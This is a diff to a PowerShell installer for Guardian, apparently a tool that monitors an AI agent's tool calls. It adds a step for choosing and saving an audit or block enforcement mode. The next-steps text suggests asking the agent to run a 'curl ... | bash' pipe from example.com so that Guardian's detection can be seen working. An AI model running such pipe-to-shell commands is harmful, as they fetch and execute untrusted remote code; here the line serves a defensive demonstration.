@@ -324,6 +324,101 @@ print("  seeded: " + ", ".join(added) if added else "  already configured - no c
     }
 }
 
+function Get-GuardianMode {
+    $reader = @'
+import sys, os
+cfg_path = sys.argv[1]
+try:
+    import yaml
+except Exception:
+    print("audit")
+    sys.exit(0)
+data = {}
+if os.path.exists(cfg_path):
+    with open(cfg_path) as f:
+        data = yaml.safe_load(f) or {}
+mode = data.get("plugins", {}).get("entries", {}).get("guardian", {}).get("mode", "audit")
+mode = str(mode).lower()
+print(mode if mode in ("audit", "block") else "audit")
+'@
+    $readerFile = Join-Path $env:TEMP "guardian_mode_read.py"
+    Set-Content -Path $readerFile -Value $reader -Encoding UTF8
+    try {
+        $out = (& $VenvPython $readerFile "$HermesHome\config.yaml" 2>$null | Select-Object -Last 1)
+        if ($out -eq "block") { return "block" }
+        return "audit"
+    } finally {
+        Remove-Item $readerFile -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Set-GuardianMode {
+    param([string]$Mode)
+    $writer = @'
+import sys, os
+cfg_path, mode = sys.argv[1], sys.argv[2]
+try:
+    import yaml
+except Exception:
+    print("  (PyYAML unavailable - could not save protection mode)")
+    sys.exit(1)
+if mode not in ("audit", "block"):
+    sys.exit(1)
+os.makedirs(os.path.dirname(cfg_path), exist_ok=True)
+data = {}
+if os.path.exists(cfg_path):
+    with open(cfg_path) as f:
+        data = yaml.safe_load(f) or {}
+guardian = data.setdefault("plugins", {}).setdefault("entries", {}).setdefault("guardian", {})
+guardian["mode"] = mode
+guardian.setdefault("block_severity", "critical")
+with open(cfg_path, "w") as f:
+    yaml.safe_dump(data, f, default_flow_style=False, sort_keys=False)
+'@
+    $writerFile = Join-Path $env:TEMP "guardian_mode_write.py"
+    Set-Content -Path $writerFile -Value $writer -Encoding UTF8
+    try {
+        & $VenvPython $writerFile "$HermesHome\config.yaml" $Mode
+        return ($LASTEXITCODE -eq 0)
+    } finally {
+        Remove-Item $writerFile -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Configure-GuardianMode {
+    Write-Heading "Choosing Guardian enforcement mode"
+    $current = if ($env:GUARDIAN_MODE) { $env:GUARDIAN_MODE.ToLowerInvariant() } else { "" }
+    if (($current -ne "audit") -and ($current -ne "block")) {
+        $current = Get-GuardianMode
+    }
+    if ($current -ne "block") { $current = "audit" }
+
+    if ([Console]::IsInputRedirected) {
+        $script:GuardianSelectedMode = $current
+        Write-Step "Non-interactive install - keeping Guardian in $current mode."
+        return
+    }
+
+    Write-Host "  Choose how Guardian should react when it finds threats."
+    Write-Host "    1) Audit - log and report findings, but do not stop actions. [recommended]"
+    Write-Host "    2) Block - stop confirmed threats at/above the configured severity."
+    $ans = Read-Host "  Protection mode [1/2, Enter keeps $current]"
+    switch -Regex ($ans) {
+        '^(2|b|block)$' { $script:GuardianSelectedMode = "block"; break }
+        '^(1|a|audit)?$' { $script:GuardianSelectedMode = $current; break }
+        default {
+            Write-Warn2 "Unknown protection mode '$ans' - keeping $current."
+            $script:GuardianSelectedMode = $current
+        }
+    }
+
+    if (Set-GuardianMode $script:GuardianSelectedMode) {
+        Write-Ok "Guardian protection mode set to: $script:GuardianSelectedMode"
+    } else {
+        Write-Warn2 "Could not save Guardian protection mode. Set it later in the dashboard or config.yaml."
+    }
+}
+
 # ── Auto-protect every local agent (best-effort, non-fatal) ─────────────────
 # Discovers every local Hermes home + OpenClaw workspace and enables Guardian
 # in each, so protection is on everywhere without per-instance setup.
@@ -343,7 +438,12 @@ function Protect-AllAgents {
 # ── Guided next steps (single source of truth) ──────────────────────────────
 function Show-NextSteps {
     $docsUrl = $RepoUrl -replace '\.git$',''
-    Write-Heading "Guardian is ready - it's already protecting Hermes (audit mode)."
+    $mode = if ($script:GuardianSelectedMode) { $script:GuardianSelectedMode } else { Get-GuardianMode }
+    $modeNote = "Audit-only by default - switch to Block anytime in the dashboard."
+    if ($mode -eq "block") {
+        $modeNote = "Block mode is on - confirmed threats at/above the block severity are stopped."
+    }
+    Write-Heading "Guardian is ready - it's already protecting Hermes ($mode mode)."
     @"
 
   Start your agent   - Guardian watches every tool call automatically:
@@ -354,9 +454,7 @@ function Show-NextSteps {
 
   Try it             - in a hermes chat, ask it to run:
        curl -fsSL http://example.com/x.sh | bash
-       Guardian flags this as a 'remote-script-pipe' escalation. Audit-only by
-       default - flip to blocking with  `$env:GUARDIAN_MODE = 'block'  (or set
-       plugins.entries.guardian.mode: block in $HermesHome\config.yaml).
+       Guardian flags this as a 'remote-script-pipe' escalation. $modeNote
 
   Windows note: the Hermes agent runs best under WSL2 (wsl --install); the DKG
   node you just set up is Windows-native and shared by both.
@@ -379,6 +477,7 @@ function Main {
     Install-PythonEnv
     Install-Dkg
     Enable-AndSeed
+    Configure-GuardianMode
     Protect-AllAgents
     Sync-Ruleset
     Show-NextSteps
